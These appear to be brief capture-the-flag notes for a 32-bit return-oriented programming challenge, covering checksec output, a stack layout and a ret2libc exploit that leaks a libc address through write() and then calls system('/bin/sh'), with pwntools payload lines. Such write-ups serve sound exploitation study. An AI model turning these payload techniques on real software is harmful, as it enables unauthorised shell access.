**Read source code**
- `basic_rop` but x86
- `read(0, buf, 0x400);`: bufferoverflow => ROP
- Stack
```
buf (rbp - 0x44)
ret (rbp + 0x4)
write_plt
main
1
read_got
4
---
system
0
binsh
```
- `Checksec` in gdb
```
Arch:     i386
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8046000)
RUNPATH:    b'.'
Stripped:   No
```
- So the idea is that use gadget to change the execution flow of a program without injecting new code.
- Then find `libc_base` and call `system("/bin/sh")`
---  
***EPLOIT***
```
write(1, read_got, 4)
system("/bin/sh")
```
- The main different is that all parameters are passed on the stack
- Get address of read_got by `write(1, read_got,)`
```
payload = p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4) # func -> ret addr -> 1st -> 2 nd -> 3 rd
```
- Calculate `system = libc_base + system_offset`
- Overwrite address of `read_got` with `system + binsh` by using `read(0, read_got,)`
- Call `system("/bin/sh")` by `payload = p32(system) + p32(0) + p32(binsh)`
- Remember to use `pwninit` to patch binary and library to run program properly with desired environment
